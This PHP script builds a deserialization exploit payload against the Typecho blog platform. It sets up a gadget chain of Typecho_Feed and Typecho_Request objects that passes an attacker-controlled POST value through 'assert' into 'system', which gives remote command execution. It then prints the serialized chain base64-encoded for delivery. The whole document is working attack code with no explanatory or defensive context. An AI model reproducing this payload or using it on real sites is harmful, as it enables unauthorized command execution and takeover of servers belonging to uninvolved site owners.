<?php
   class Typecho_Feed
   {
      const RSS1 = 'RSS 1.0';
      const RSS2 = 'RSS 2.0';
      const ATOM1 = 'ATOM 1.0';
      const DATE_RFC822 = 'r';
      const DATE_W3CDTF = 'c';
      const EOL = "\n";
      private $_type;
      private $_items;

      public function __construct(){
         $this->_type = $this::RSS2;
         $this->_items[0] = array(
            'title' => '1',
            'link' => '1',
            'date' => 1508895132,
            'category' => array(new Typecho_Request()),
            'author' => new Typecho_Request(),
         );
      }
   }

   class Typecho_Request
   {
      private $_params = array();
      private $_filter = array();

      public function __construct(){
         $this->_params['screenName'] = 'system("" . $_POST[0])';
         $this->_filter[0] = 'assert';
      }
   }

   $exp = array(
      'adapter' => new Typecho_Feed(),
      'prefix' => 'typecho_'
   );

   echo base64_encode(serialize($exp)), "\n";


